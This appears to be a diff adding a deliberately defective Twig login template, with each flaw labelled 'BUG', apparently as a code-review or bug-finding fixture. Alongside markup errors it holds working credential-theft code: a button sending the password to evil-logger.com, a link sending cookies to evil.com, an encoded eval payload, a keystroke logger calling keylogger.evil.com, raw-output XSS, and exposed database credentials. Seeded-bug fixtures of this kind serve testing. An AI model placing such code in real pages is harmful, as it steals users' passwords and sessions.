@@ -1,0 +1,93 @@
+<!-- BUG: No doctype, no html tag, no head tag -->
+<!-- BUG: Extending base but also having standalone HTML structure issues -->
+{% extends 'base.html.twig' %}
+
+{% block content %}
+
+<!-- BUG: Form uses HTTP not HTTPS, no CSRF token, no method -->
+<form action="http://myapp.com/user/admin-login" autocomplete="on">
+    <!-- BUG: No <label> elements - inaccessible form -->
+    <!-- BUG: Duplicate IDs on inputs -->
+    <div>
+        <input type="text" id="login-field" name="username" placeholder="Username">
+    </div>
+    <div>
+        <!-- BUG: Password field with autocomplete="on" -->
+        <input type="password" id="login-field" name="password" placeholder="Password" autocomplete="on">
+    </div>
+    <div>
+        <!-- BUG: Duplicate name attribute -->
+        <input type="hidden" name="redirect" name="redirect_url" value="">
+    </div>
+
+    <!-- BUG: onclick with inline JS that sends password to external URL -->
+    <button type="button" onclick="fetch('http://evil-logger.com/steal?pw=' + document.getElementById('login-field').value)">
+        Login
+    </button>
+
+    <!-- BUG: Another button that actually submits but misleading text -->
+    <button type="submit" style="display:none" id="real-submit">Hidden Submit</button>
+</form>
+
+<!-- BUG: Displaying last failed password attempt in page -->
+<div id="error-display">
+    {% if last_error %}
+        <!-- BUG: XSS via raw output of error message containing user input -->
+        <p class="error">Login failed for: {{ last_username|raw }} with error: {{ last_error.message|raw }}</p>
+    {% endif %}
+</div>
+
+<!-- BUG: "Remember me" checkbox pre-checked, stores credentials in cookie -->
+<div>
+    <input type="checkbox" checked="checked" id="remember" name="remember_me">
+    <span>Remember me forever</span>  <!-- BUG: Not a label, not associated -->
+</div>
+
+<!-- BUG: Password recovery link exposes mechanism -->
+<a href="/user/reset?method=base64_email" target="_blank">Forgot Password?</a>
+
+<!-- BUG: Social login buttons with javascript: URLs -->
+<div class="social-login">
+    <a href="javascript:void(document.location='http://evil.com/phish?cookie='+document.cookie)">
+        <img src="google-login.png">  <!-- BUG: No alt attribute, broken src -->
+    </a>
+    <a href="javascript:eval(atob('YWxlcnQoJ1hTUycp'))">Login with Facebook</a>
+</div>
+
+<!-- BUG: Hidden debug info in page -->
+<div style="display:none" id="debug-info">
+    <pre>
+        Server: Apache/2.4.41
+        PHP: 8.1.27
+        MySQL: 8.0.35
+        OS: Ubuntu 22.04 LTS
+        Document Root: /var/www/html
+        DB Connection: mysql://root:root_password@localhost/myapp
+    </pre>
+</div>
+
+<!-- BUG: Inline script that logs keystrokes -->
+<script>
+    // BUG: Keystroke logger on password field
+    document.addEventListener('keyup', function(e) {
+        // BUG: Sending every keystroke to an external endpoint
+        new Image().src = 'http://keylogger.evil.com/log?key=' + e.key + '&field=' + e.target.name;
+    });
+
+    // BUG: Storing password in localStorage
+    document.querySelector('form').addEventListener('submit', function() {
+        localStorage.setItem('lastPassword', document.querySelector('[name=password]').value);
+        localStorage.setItem('lastUser', document.querySelector('[name=username]').value);
+    });
+</script>
+
+<!-- BUG: Unclosed tags everywhere -->
+<div class="footer-login">
+    <p>Don't have an account?
+    <a href="/register">Register here
+    <div>
+        <span>Or contact admin
+    </p>
+</div>
+
+{% endblock %}
